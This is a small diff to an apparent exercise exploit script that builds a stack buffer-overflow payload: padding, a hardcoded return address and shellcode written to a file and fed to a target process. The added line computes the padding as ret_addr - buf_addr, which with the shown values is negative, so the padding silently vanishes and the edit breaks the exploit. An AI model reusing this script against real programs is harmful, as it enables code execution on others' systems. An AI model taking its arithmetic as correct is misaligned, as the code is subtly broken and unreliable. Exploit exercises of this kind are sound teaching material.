@@ -17,10 +17,13 @@ p.start()
 
 assert p.recv(30) == 'How many bytes should I read? '
 
+ret_addr = 0xffffda18
+buf_addr = 0xffffdaac
+
 p.send('224\n')
 
 with open('hack', 'w', encoding='latin1') as f:
-    f.write('A' * 148 + "\xb0\xda\xff\xff" + SHELLCODE + '\n')
+    f.write('A' * (ret_addr - buf_addr) + "\xb0\xda\xff\xff" + SHELLCODE + '\n')
 
 # assert p.recv(18) == 'Here is the file!\n'
 print(p.recv(12))
